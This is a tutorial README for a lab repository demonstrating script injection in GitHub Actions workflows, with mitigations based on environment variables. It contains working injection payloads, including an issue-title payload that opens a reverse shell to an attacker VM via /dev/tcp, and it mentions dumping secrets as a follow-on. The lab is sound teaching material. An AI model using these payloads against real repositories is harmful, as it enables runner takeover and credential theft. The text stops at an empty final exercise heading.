# workflow-script-injection

The [Check issue title](.github/workflows/check-issue-title.yml) workflow simply checks if the title of the workflow begins with `octocat`. If so, the workflow succeeds. If not, the workflow fails.

The [Check issue comment](.github/workflows/check-issue-comment.yml) workflow simply checks if the issue comment begins with `octocat`. If so, the workflow succeeds. If not, the workflow fails.

These workflows are vulnerable to script injection. Let's find out why.

## Exercise 1 - Script injection in the run command
The [Check issue title](.github/workflows/check-issue-title.yml) workflow uses the issue title in the `run` command as follows:
```
title="${{ github.event.issue.title }}"
```
This provides an opportunity for an attacker to exploit the workflow with an issue titled `octocat"; ls -l $GITHUB_WORKSPACE"`. Using this title, the script looks like the following...
```
title="octocat"; ls -l $GITHUB_WORKSPACE"
```

Let's create a new issue with this title and see what happens. We observe that the workflow runs the command `ls -l $GITHUB_WORKSPACE`!  

<img width="1042" alt="Screenshot 2023-08-30 at 7 38 43 PM" src="https://github.com/robandpdx/workflow-script-injection/assets/95243761/e3fa3917-2834-45cc-a297-d25614c3185e">

Ok. Big deal. So we were able to see what is in the workspace directory. Who cares?  
Now let's try something a little more sinister...

## Exercise 2 - Getting a shell on the runner
Spin up a linux vm in the cloud that has a public IP address. Login and run `nc -nvlp 1337`. Then open a new issue with the title `octocat"; bash -i >& /dev/tcp/<YOUR-VM-IP-ADDRESS>/1337 0>&1 ; ls -l $GITHUB_WORKSPACE"`  

Now I have a shell on the runner! This is a great "foot in the door" from which I can attemp other exploits, like dumping secrets or cloud credentials to use in other attacks.  

## Exercise 3 - Script injection in github-script action
The [Check issue comment](.github/workflows/check-issue-comment.yml) workflow uses issue comment body in the [github-script actions](https://github.com/actions/github-script) as follows:
```
const comment="${{ github.event.comment.body }}"
```
This provides an opportunity for an attacker to exploit the workflow with an issue comment `octocat";console.log('WTF!!!');//`. Using this title, the script looks like the following...
```
const comment="octocat";console.log('WTF!!!');//"
```

Let's create a new issue comment with this body and see what happens. We observe that the workflow runs the command `console.log('WTF!!!');//`!  

<img width="1034" alt="Screenshot 2023-08-30 at 9 07 51 PM" src="https://github.com/robandpdx/workflow-script-injection/assets/95243761/8730dc36-b596-4766-b24a-ec85209a6763">

## Exercise 4 - Mitigate script injection in the run command
To mitigate the script injection issue in the [Check issue title](.github/workflows/check-issue-title.yml) workflow that we saw in exercise 1, we need to do the following:
1. Remove `${{ github.event.issue.title }}` from the run command 
2. Set and environment variable to the value `${{ github.event.issue.title }}`
3. Use the environment variable in the run command

The `Check issue title` step should look like this after our edits...
```
      - name: Check issue title
        env:
            ISSUE_TITLE: ${{ github.event.issue.title }}
        run: |
        if [[ $ISSUE_TITLE =~ ^octocat ]]; then
        echo "Issue title starts with 'octocat'"
        exit 0
        else
        echo "Issue title did not start with 'octocat'"
        exit 1
        fi
```

Now let's create a new issue with the title we used to exploit the script injection vulnerability we saw in exercise 1 to see if we have mitigated the issue. Create a new issue titled `octocat"; ls -l $GITHUB_WORKSPACE"`.

<img width="1002" alt="Screenshot 2023-09-11 at 5 24 09 PM" src="https://github.com/robandpdx/workflow-script-injection/assets/95243761/c3026073-eb65-443e-96e7-9ceb560fd5eb">

We find that the workflow does not execute the `ls -l $GITHUB_WORKSPACE` command. Success!

## Exercise 5 - Migrate script injection in github-script action
To mitigate the script injection issue in the [Check issue comment](.github/workflows/check-issue-comment.yml) workflow, we need to do the following:
1. Remove `${{ github.event.issue.title }}` from our github-script action usage
2. Set and environment variable to the value `${{ github.event.issue.title }}`
3. Use the environment variable in our github-script action usage

The `Check issue comment` step should look like this after our edits...  
```
      - name: Check issue comment
        uses: actions/github-script@v6
        env:
            ISSUE_COMMENT: ${{ github.event.comment.body }}
        with:
          script: |
            const comment=process.env.ISSUE_COMMENT
            if (comment.startsWith('octocat')) {
              console.log("Issue comment starts with 'octocat'")
            } else {
              console.log("Issue comment did not start with 'octocat'")
              process.exit(1)
            }
```

Now let's create a new issue comment with the contents we used to exploit the script injection vulnerability we saw in exercise 3 to see if we have mitigated the issue. Create a new issue comment with the contents `octocat";console.log('WTF!!!');//`.

<img width="1002" alt="Screenshot 2023-09-12 at 10 30 57 AM" src="https://github.com/robandpdx/workflow-script-injection/assets/95243761/36134189-581a-41c8-9fa2-2401f01c0881">

We find that the workflow does not execute the `console.log('WTF!!!');` command. Success!

## Exercise 6 - Mitigate by using a github action

